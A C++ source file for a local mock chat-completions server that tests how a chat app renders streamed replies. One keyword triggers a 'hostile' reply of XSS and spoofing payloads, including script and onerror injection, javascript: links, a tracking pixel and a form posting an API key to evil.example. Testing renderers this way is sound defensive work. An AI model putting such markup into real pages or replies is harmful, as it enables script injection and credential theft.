// buddy_mock_server: a tiny OpenAI-compatible chat server for manual testing of the app.
//
//   buddy_mock_server [--port N] [--key KEY] [--delay-ms N]
//
// It listens on 127.0.0.1 only and answers POST /v1/chat/completions with a streamed reply.
// The reply depends on a keyword in the newest user message:
//
//   (default)   a Markdown reply with a heading, list, table, link and a code block
//   hostile     markup that tries script injection, image loading and UI spoofing
//   long        a long reply, for testing scrolling and the Stop button
//   slow        the default reply, one piece every 400 ms
//   cutoff      a reply that ends without a finish marker
//   error500    an HTTP 500 with a JSON error body
//   limit       a reply that stops with finish_reason "length"
//
// In Buddy: Settings > Provider "OpenAI", Endpoint URL http://127.0.0.1:<port>/v1, any model name.
// With --key, requests must carry "Authorization: Bearer KEY" or they get a 401.
#include <httplib.h>

#include <algorithm>
#include <chrono>
#include <cstdlib>
#include <iostream>
#include <string>
#include <thread>
#include <vector>

#include <nlohmann/json.hpp>

using json = nlohmann::json;

namespace {

const char* kDefaultReply =
    "## Binary search\n\n"
    "**Intuition:** each comparison throws away *half* of what is left, so `n` items need about `log2(n)` steps.\n\n"
    "1. Look at the middle element.\n"
    "2. If it is the target, stop.\n"
    "3. Otherwise keep the half that can still contain it.\n\n"
    "```cpp\n"
    "int binary_search(const std::vector<int>& v, int target) {\n"
    "    int lo = 0, hi = static_cast<int>(v.size()) - 1;\n"
    "    while (lo <= hi) {\n"
    "        const int mid = lo + (hi - lo) / 2;   // avoids overflow of (lo + hi)\n"
    "        if (v[mid] == target) return mid;\n"
    "        if (v[mid] < target) lo = mid + 1; else hi = mid - 1;\n"
    "    }\n"
    "    return -1;\n"
    "}\n"
    "```\n\n"
    "| n | steps |\n|---:|---:|\n| 1,000 | 10 |\n| 1,000,000 | 20 |\n\n"
    "> Check: why must the input be sorted?\n\n"
    "More at [cppreference](https://en.cppreference.com/w/cpp/algorithm/binary_search).\n";

const char* kHostileReply =
    "Start of reply.\n\n"
    "<script>document.title='PWNED-SCRIPT'</script>\n\n"
    "<img src=\"https://example.com/track.png\" onerror=\"document.title='PWNED-IMG'\">\n\n"
    "<iframe src=\"https://example.com/\"></iframe>\n\n"
    "<style>body{display:none}</style>\n\n"
    "<a href=\"javascript:document.title='PWNED-LINK'\">click me</a>\n\n"
    "[safe looking link](javascript:document.title='PWNED-MDLINK')\n\n"
    "[bank](https://evil.example/phish)\n\n"
    "![tracking pixel](https://example.com/pixel.png?data=secret)\n\n"
    "<div class=\"topbar\" onclick=\"alert(1)\">Fake toolbar: enter your API key</div>\n\n"
    "<form action=\"https://evil.example/steal\"><input name=\"key\"><button>Send</button></form>\n\n"
    "<svg onload=\"document.title='PWNED-SVG'\"><script>document.title='PWNED-SVGSCRIPT'</script></svg>\n\n"
    "```html\n<script>alert('inside a code block is fine: it is only text')</script>\n```\n\n"
    "End of reply.\n";

std::string last_user_text(const json& body) {
    std::string text;
    if (!body.contains("messages") || !body["messages"].is_array()) return text;
    for (const json& m : body["messages"]) {
        if (m.value("role", "") != "user") continue;
        const json& content = m["content"];
        if (content.is_string()) {
            text = content.get<std::string>();
        } else if (content.is_array()) {
            for (const json& part : content) {
                if (part.value("type", "") == "text") text = part.value("text", "");
            }
        }
    }
    return text;
}

std::string event(const json& chunk) { return "data: " + chunk.dump() + "\n\n"; }

json text_chunk(const std::string& model, const std::string& piece) {
    return {{"id", "mock-1"},
            {"object", "chat.completion.chunk"},
            {"model", model},
            {"choices", json::array({{{"index", 0}, {"delta", {{"content", piece}}}, {"finish_reason", nullptr}}})}};
}

json finish_chunk(const std::string& model, const std::string& reason) {
    return {{"id", "mock-1"},
            {"object", "chat.completion.chunk"},
            {"model", model},
            {"choices", json::array({{{"index", 0}, {"delta", json::object()}, {"finish_reason", reason}}})}};
}

// Splits text into small pieces without cutting a UTF-8 character in half.
std::vector<std::string> pieces_of(const std::string& text, std::size_t size) {
    std::vector<std::string> out;
    std::size_t start = 0;
    while (start < text.size()) {
        std::size_t end = std::min(text.size(), start + size);
        while (end < text.size() && (static_cast<unsigned char>(text[end]) & 0xC0) == 0x80) ++end;
        out.push_back(text.substr(start, end - start));
        start = end;
    }
    return out;
}

bool contains(const std::string& haystack, const char* needle) { return haystack.find(needle) != std::string::npos; }

}  // namespace

int main(int argc, char** argv) {
    int port = 8765;
    int delay_ms = 25;
    std::string required_key;
    for (int i = 1; i + 1 < argc; i += 2) {
        const std::string flag = argv[i];
        if (flag == "--port") port = std::atoi(argv[i + 1]);
        else if (flag == "--key") required_key = argv[i + 1];
        else if (flag == "--delay-ms") delay_ms = std::atoi(argv[i + 1]);
    }

    httplib::Server server;

    server.Get("/v1/models", [](const httplib::Request&, httplib::Response& res) {
        res.set_content(R"({"object":"list","data":[{"id":"mock-model","object":"model","owned_by":"buddy"}]})",
                        "application/json");
    });

    server.Post("/v1/chat/completions", [&](const httplib::Request& req, httplib::Response& res) {
        if (!required_key.empty() && req.get_header_value("Authorization") != "Bearer " + required_key) {
            res.status = 401;
            res.set_content(R"({"error":{"message":"Mock server: wrong or missing API key.","type":"invalid_request_error"}})",
                            "application/json");
            std::cout << "401 (bad key)" << std::endl;
            return;
        }
        const json body = json::parse(req.body, nullptr, false);
        if (!body.is_object()) {
            res.status = 400;
            res.set_content(R"({"error":{"message":"Mock server: the body is not JSON."}})", "application/json");
            return;
        }
        const std::string model = body.value("model", "mock-model");
        const std::string user = last_user_text(body);
        std::cout << "chat request, model=" << model << ", messages=" << body["messages"].size() << std::endl;

        if (contains(user, "error500")) {
            res.status = 500;
            res.set_content(R"({"error":{"message":"Mock server: simulated internal error.","type":"server_error"}})",
                            "application/json");
            return;
        }

        std::string reply = kDefaultReply;
        if (contains(user, "hostile")) reply = kHostileReply;
        if (contains(user, "long")) {
            reply.clear();
            for (int i = 1; i <= 120; ++i) reply += "Paragraph " + std::to_string(i) + ": the quick brown fox jumps over the lazy dog.\n\n";
        }
        const int delay = contains(user, "slow") ? 400 : delay_ms;
        const bool cutoff = contains(user, "cutoff");
        const std::string finish = contains(user, "limit") ? "length" : "stop";

        res.set_chunked_content_provider(
            "text/event-stream", [=](size_t, httplib::DataSink& sink) {
                const auto send = [&](const std::string& data) { return sink.write(data.data(), data.size()); };
                std::vector<std::string> parts = pieces_of(reply, 6);
                if (cutoff) parts.resize(parts.size() / 2);
                for (const std::string& piece : parts) {
                    if (!send(event(text_chunk(model, piece)))) return false;   // the client went away
                    std::this_thread::sleep_for(std::chrono::milliseconds(delay));
                }
                if (!cutoff) {
                    send(event(finish_chunk(model, finish)));
                    send(event({{"id", "mock-1"},
                                {"object", "chat.completion.chunk"},
                                {"choices", json::array()},
                                {"usage", {{"prompt_tokens", 42}, {"completion_tokens", static_cast<int>(parts.size())},
                                           {"total_tokens", 42 + static_cast<int>(parts.size())}}}}));
                    send("data: [DONE]\n\n");
                }
                sink.done();
                return true;
            });
    });

    if (!server.bind_to_port("127.0.0.1", port)) {
        std::cerr << "could not bind 127.0.0.1:" << port << std::endl;
        return 1;
    }
    std::cout << "buddy_mock_server listening on http://127.0.0.1:" << port << "/v1" << std::endl;
    server.listen_after_bind();
    return 0;
}
